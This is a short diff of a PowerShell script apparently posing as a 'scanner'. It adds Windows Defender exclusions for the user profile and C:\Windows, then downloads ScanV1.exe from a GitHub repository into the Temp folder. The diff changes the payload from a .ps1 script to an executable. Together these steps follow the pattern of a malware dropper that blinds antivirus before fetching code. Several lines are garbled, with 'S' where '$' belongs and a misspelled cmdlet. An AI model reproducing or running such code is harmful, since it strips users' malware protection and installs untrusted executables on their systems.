@@ -3,17 +3,17 @@ Add-HpPreference -ExclusionPath Senv:USERPROFILE
 Add-MpPreference -ExclusionPath C:\Windows 
 
 ###################################################################################################
-$url = "https://github.com/Oqgpp/scanner/blob/main/scanv1.ps1"
+$url = "https://github.com/Oqgpp/scanner/blob/main/ScanV1.exe"
 
 
 ###################################################################################################
 
-$output = "$env:Temp/scanv1.ps1"
+$output = "$env:Temp/ScanV1.exe"
 
 
 ###################################################################################################
 
-Invoke-WebRequest -Uri Surl -OutFile Soutput 
+Invoke-WebRequest -Uri Surl -OutFile $output 
 
 
 ###################################################################################################
